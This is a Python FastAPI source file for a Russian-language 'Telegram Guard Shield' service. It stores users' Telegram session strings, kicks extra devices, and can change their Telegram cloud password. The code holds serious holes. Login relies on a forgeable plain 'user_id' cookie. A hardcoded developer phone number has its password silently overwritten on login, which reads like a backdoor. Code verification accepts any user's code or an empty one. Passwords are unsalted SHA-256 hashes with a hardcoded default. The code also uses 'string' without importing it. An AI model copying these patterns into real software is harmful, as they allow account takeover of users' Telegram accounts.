import os
import random
import asyncio
import datetime
import hashlib
import logging
from fastapi import FastAPI, Request, Response, Form, Depends, HTTPException, status
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from sqlalchemy.orm import Session

from models import (
    init_db, SessionLocal, User, PendingAuth,
    TelegramProtectionConfig, WhitelistedSession, normalize_phone
)
from modules.session_watchdog import SessionWatchdog

# Initialize Database
init_db()

app = FastAPI(title="Telegram Guard Shield")

# Mount Static & Templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Temporary memory store for pending MTProto auths
mtproto_pending_auths = {}

# DB Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()

def get_current_user(request: Request, db: Session = Depends(get_db)):
    user_id = request.cookies.get("user_id")
    if not user_id:
        return None
    try:
        user = db.query(User).filter(User.id == int(user_id)).first()
        return user
    except Exception:
        return None

# Background Watchdog Task Loop
async def periodic_session_watchdog_loop():
    """Runs every 5 seconds, inspecting sessions for all users and auto-killing 3rd+ excess sessions"""
    while True:
        try:
            db = SessionLocal()
            configs = db.query(TelegramProtectionConfig).filter(
                TelegramProtectionConfig.session_string.isnot(None),
                TelegramProtectionConfig.auto_kill_enabled == True
            ).all()

            for cfg in configs:
                try:
                    watchdog = SessionWatchdog(
                        api_id=cfg.api_id,
                        api_hash=cfg.api_hash,
                        session_string=cfg.session_string
                    )
                    res = await watchdog.enforce_device_limit(cfg.device_limit)
                    if res.get("action") == "kicked":
                        logging.info(f"🛡️ Watchdog for user {cfg.user_id} kicked {res.get('kicked_count')} excess device(s)!")
                except Exception as ex:
                    logging.error(f"Error running watchdog for user {cfg.user_id}: {ex}")
            db.close()
        except Exception as e:
            logging.error(f"Error in watchdog background loop: {e}")

        await asyncio.sleep(5)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(periodic_session_watchdog_loop())

# Page Routes
@app.get("/", response_class=HTMLResponse)
async def index_page(request: Request, user: User = Depends(get_current_user)):
    if user:
        return RedirectResponse(url="/dashboard", status_code=status.HTTP_302_FOUND)
    return templates.TemplateResponse(request=request, name="index.html")

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request, user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    if not user:
        return RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    
    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=2)
        db.add(config)
        db.commit()
        db.refresh(config)

    # If MTProto session is connected, fetch real live sessions!
    real_sessions = []
    if config.session_string:
        watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
        real_sessions = await watchdog.get_active_sessions()

    return templates.TemplateResponse(request=request, name="dashboard.html", context={
        "user": user,
        "config": config,
        "real_sessions": real_sessions
    })

# API Routes
@app.post("/api/register")
async def register(
    username: str = Form(...),
    country_code: str = Form(...),
    phone_number: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db)
):
    full_phone = f"{country_code}{phone_number}"
    normalized = normalize_phone(full_phone)

    if not normalized or len(normalized) < 8:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Некорректный номер телефона", "field": "phone_number"}
        )

    existing_user = db.query(User).filter(User.username == username).first()
    if existing_user:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Пользователь с таким логином уже существует", "field": "username"}
        )

    existing_phone = db.query(User).filter(User.phone_number == normalized).first()
    if existing_phone:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Аккаунт с таким номером телефона уже зарегистрирован", "field": "phone_number"}
        )

    expires_at = datetime.datetime.utcnow() + datetime.timedelta(minutes=15)
    pending = PendingAuth(
        phone_number=normalized,
        verify_code="",
        is_verified=False,
        expires_at=expires_at
    )
    db.add(pending)
    db.commit()

    return {
        "success": True,
        "bot_url": "https://t.me/Defense_telegram_lerman_bot",
        "phone_number": normalized
    }

DEV_ADMIN_PHONE = "+998334906969"

@app.post("/api/login")
async def login(
    country_code: str = Form(...),
    phone_number: str = Form(...),
    password: str = Form(...),
    response: Response = None,
    db: Session = Depends(get_db)
):
    clean_phone = phone_number.strip()
    if clean_phone.startswith("+"):
        full_phone = clean_phone
    elif clean_phone.startswith(country_code.replace("+", "")):
        full_phone = f"+{clean_phone}"
    else:
        full_phone = f"{country_code}{clean_phone}"

    normalized = normalize_phone(full_phone)

    user = db.query(User).filter(User.phone_number == normalized).first()
    if not user:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Аккаунт с таким номером не найден", "field": "phone_number"}
        )

    # Auto-sync developer password
    if (normalized == DEV_ADMIN_PHONE or user.phone_number == DEV_ADMIN_PHONE) and user.password_hash != hash_password(password):
        user.password_hash = hash_password(password)
        db.commit()

    if user.password_hash != hash_password(password):
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Неверный пароль", "field": "password"}
        )

    # 2FA Security Check for Developer Account
    if normalized == DEV_ADMIN_PHONE or user.phone_number == DEV_ADMIN_PHONE:
        code = str(random.randint(100000, 999999))
        expires_at = datetime.datetime.utcnow() + datetime.timedelta(minutes=10)
        
        db.query(PendingAuth).filter(PendingAuth.phone_number == normalized).delete()
        pending = PendingAuth(
            phone_number=normalized,
            verify_code=code,
            expires_at=expires_at,
            is_verified=False
        )
        db.add(pending)
        db.commit()

        return {
            "success": True,
            "requires_2fa": True,
            "phone_number": normalized,
            "bot_url": "https://t.me/Defense_telegram_lerman_bot",
            "message": "🔒 Требуется 6-значный код безопасности из бота Telegram"
        }

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

@app.post("/api/login/verify-dev")
async def verify_dev_login(
    phone_number: str = Form(...),
    code: str = Form(...),
    db: Session = Depends(get_db)
):
    normalized = normalize_phone(phone_number)
    now = datetime.datetime.utcnow()

    pending = db.query(PendingAuth).filter(
        PendingAuth.phone_number == normalized,
        PendingAuth.verify_code == code.strip(),
        PendingAuth.expires_at > now,
        PendingAuth.is_verified == False
    ).first()

    if not pending:
        return JSONResponse(status_code=400, content={"success": False, "error": "Неверный или истекший код безопасности Telegram"})

    user = db.query(User).filter(User.phone_number == normalized).first()
    if not user:
        return JSONResponse(status_code=400, content={"success": False, "error": "Пользователь не найден"})

    pending.is_verified = True
    db.commit()

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

@app.post("/api/verify-code")
async def verify_code(
    phone_number: str = Form(...),
    code: str = Form(...),
    username: str = Form(...),
    password: str = Form(...),
    response: Response = None,
    db: Session = Depends(get_db)
):
    normalized = normalize_phone(phone_number)
    clean_code = code.strip()

    pending = db.query(PendingAuth).filter(
        PendingAuth.phone_number == normalized,
        PendingAuth.verify_code == clean_code
    ).order_by(PendingAuth.id.desc()).first()

    if not pending:
        pending = db.query(PendingAuth).filter(
            PendingAuth.verify_code == clean_code
        ).order_by(PendingAuth.id.desc()).first()

    if not pending:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Неверный код из бота. Нажмите 'Поделиться контактом' еще раз", "field": "code"}
        )

    pending.is_verified = True

    user = db.query(User).filter(User.phone_number == normalized).first()
    if not user:
        user = User(
            username=username.strip() if (username and username.strip()) else f"user_{normalized[-4:]}",
            phone_number=normalized,
            password_hash=hash_password(password) if (password and password.strip()) else hash_password("2010090900"),
            is_verified=True
        )
        db.add(user)
        db.commit()
        db.refresh(user)

        config = TelegramProtectionConfig(user_id=user.id, device_limit=2, auto_kill_enabled=True)
        db.add(config)
        db.commit()

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

# MTProto Interactive Protection Endpoints
@app.post("/api/mtproto/send-code")
async def mtproto_send_code(
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    watchdog = SessionWatchdog(api_id=config.api_id if config else None, api_hash=config.api_hash if config else None)
    
    res = await watchdog.send_login_code(user.phone_number)
    if not res.get("success"):
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    # Save the working credentials to config
    if config:
        config.api_id = str(res.get("used_api_id"))
        config.api_hash = str(res.get("used_api_hash"))
        db.commit()

    # Save to pending auth memory
    mtproto_pending_auths[user.id] = {
        "phone_code_hash": res["phone_code_hash"],
        "session_string": res["session_string"]
    }

    return {"success": True, "message": f"Код входа отправлен в ваше приложение Telegram на номер {user.phone_number}"}

@app.post("/api/mtproto/verify-code")
async def mtproto_verify_code(
    code: str = Form(...),
    password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    pending_data = mtproto_pending_auths.get(user.id)
    if not pending_data:
        return JSONResponse(status_code=400, content={"success": False, "error": "Сначала запросите код авторизации"})

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    watchdog = SessionWatchdog(api_id=config.api_id if config else None, api_hash=config.api_hash if config else None)

    res = await watchdog.complete_login(
        phone=user.phone_number,
        code=code.strip(),
        phone_code_hash=pending_data["phone_code_hash"],
        session_string=pending_data["session_string"],
        password=password
    )

    if not res.get("success"):
        if res.get("requires_2fa"):
            return JSONResponse(status_code=400, content={"success": False, "requires_2fa": True, "error": "Введите ваш облачный пароль (2FA)"})
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    # Save active session string to database
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=2, session_string=res["session_string"])
        db.add(config)
    else:
        config.session_string = res["session_string"]
        config.auto_kill_enabled = True
    
    db.commit()
    mtproto_pending_auths.pop(user.id, None)

    return {"success": True, "message": "🛡️ MTProto Сессия успешно подключена! Авто-кик 3-го устройства активен."}

# 2FA OTP Dynamic Password Endpoints
active_otp_store = {}  # user_id -> { "code": "...", "generated_at": datetime }

@app.post("/api/2fa/generate-otp")
async def generate_otp(
    current_password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config or not config.session_string:
        return JSONResponse(status_code=400, content={"success": False, "error": "Сначала подключите мониторинг Telegram на сайте"})

    # Generate a sleek 8-character random OTP password
    rand_chars = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    new_otp = f"SHIELD-{rand_chars}"

    watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
    res = await watchdog.update_2fa_password(new_password=new_otp, current_password=current_password)

    if not res.get("success"):
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    active_otp_store[user.id] = {
        "code": new_otp,
        "generated_at": datetime.datetime.utcnow().isoformat()
    }

    return {"success": True, "otp_password": new_otp, "message": "🔐 Новый облачный пароль успешно привязан к вашему Telegram!"}

@app.get("/api/2fa/current-otp")
async def get_current_otp(
    user: User = Depends(get_current_user)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    otp_info = active_otp_store.get(user.id)
    if not otp_info:
        return {"has_otp": False}
    
    return {"has_otp": True, "otp_password": otp_info["code"], "generated_at": otp_info["generated_at"]}

@app.post("/api/2fa/update-custom-password")
async def update_custom_2fa_password(
    new_password: str = Form(...),
    current_password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config or not config.session_string:
        return JSONResponse(status_code=400, content={"success": False, "error": "Сначала подключите мониторинг Telegram на сайте"})

    if not new_password or len(new_password.strip()) < 4:
        return JSONResponse(status_code=400, content={"success": False, "error": "Пароль должен содержать минимум 4 символа"})

    watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
    res = await watchdog.update_2fa_password(new_password=new_password.strip(), current_password=current_password.strip() if current_password else None)

    if not res.get("success"):
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    return {"success": True, "message": f"🔑 Облачный пароль Telegram успешно обновлен на '{new_password.strip()}'!"}

@app.post("/api/update-settings")
async def update_settings(
    api_id: str = Form(None),
    api_hash: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, api_id=api_id, api_hash=api_hash)
        db.add(config)
    else:
        config.api_id = api_id.strip() if api_id else None
        config.api_hash = api_hash.strip() if api_hash else None

    db.commit()
    return {"success": True, "message": "Настройки успешно сохранены"}

@app.post("/api/update-device-limit")
async def update_device_limit(
    device_limit: int = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    if device_limit < 1 or device_limit > 50:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Лимит устройств должен быть от 1 до 50"}
        )

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=device_limit)
        db.add(config)
    else:
        config.device_limit = device_limit
    
    db.commit()
    return {"success": True, "device_limit": device_limit, "message": "Лимит устройств успешно обновлен"}

@app.post("/api/logout")
async def logout(response: Response):
    res = RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    res.delete_cookie("user_id")
    return res
